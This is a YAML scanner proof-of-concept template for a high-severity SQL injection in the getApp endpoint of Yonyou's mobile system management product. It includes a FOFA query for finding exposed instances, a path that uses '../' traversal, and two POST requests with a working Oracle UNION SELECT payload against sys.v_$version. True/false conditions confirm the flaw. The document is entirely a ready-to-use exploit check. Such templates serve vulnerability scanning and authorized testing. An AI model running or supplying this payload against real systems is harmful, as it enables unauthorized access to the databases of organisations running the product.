id: poc-yaml-yongyou-mobile-manager-getapp-sqli
info:
  name: 用友 移动系统管理 getApp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友 移动管理系统
  fofa: app="用友-移动系统管理"
requests:
- method: POST
  path: /mobsm/common/../appManage/getApp
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: pk_dvcmngmnt=0' union select banner,'test+SQLi','123',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
    from sys.v_$version where 1=0--+
  expression: "status_code == 200 && \nbody == \"[]\"\n"
- method: POST
  path: /mobsm/common/../appManage/getApp
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: pk_dvcmngmnt=0' union select banner,'test+SQLi','123',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
    from sys.v_$version where 1=1--+
  expression: "status_code == 200 && \ncontains(body,\"\\\"pk_dvcmngmnt\\\"\") &&\n\
    contains(body,\"\\\"primaryKey\\\"\") &&\ncontains(body,\"\\\"attributeNames\\\
    \"\") &&\ncontains(body,\"\\\"tableName\\\"\")\n"
variables: {}
transport: http
